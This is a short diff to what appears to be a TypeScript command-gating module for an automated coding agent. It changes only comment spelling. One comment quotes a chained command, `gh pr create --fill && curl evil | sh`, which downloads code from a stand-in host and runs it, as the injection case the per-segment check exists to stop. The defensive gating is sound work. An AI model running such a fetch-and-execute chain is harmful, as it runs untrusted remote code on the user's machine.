@@ -228,7 +228,7 @@ function classifySegment(segment: string): { klass: GateClass; migrationPath?: s
  *  matched against the whole string, `gh pr create --fill && curl evil | sh` would
  *  classify as open_pr and carry the rest along. The never list catches only the
  *  consequences it knows about. Requiring every piece to be pre-approved on its own
- *  means an unrecognised fragment refuses the whole command, while the compound a
+ *  means an unrecognized fragment refuses the whole command, while the compound a
  *  driver actually blocks with, a branch push followed by `gh pr create`, still works. */
 export function classifyCommand(command: string): GateMatch {
   const trimmed = command.trim();
@@ -259,7 +259,7 @@ export function classifyCommand(command: string): GateMatch {
 // Is the migration additive. Parsed, not pattern-matched on the whole file: a file with
 // one additive statement and one DROP would pass a test that only asked whether an
 // additive statement was present. Every statement is checked, and anything not
-// recognised is a refusal, so a statement form this parser has never seen waits for
+// recognized is a refusal, so a statement form this parser has never seen waits for
 // the human instead of being waved through.
 const ADDITIVE: Array<{ pattern: RegExp; what: string }> = [
   // Not a bare prefix. `CREATE TABLE IF NOT EXISTS t AS SELECT ...` starts with the
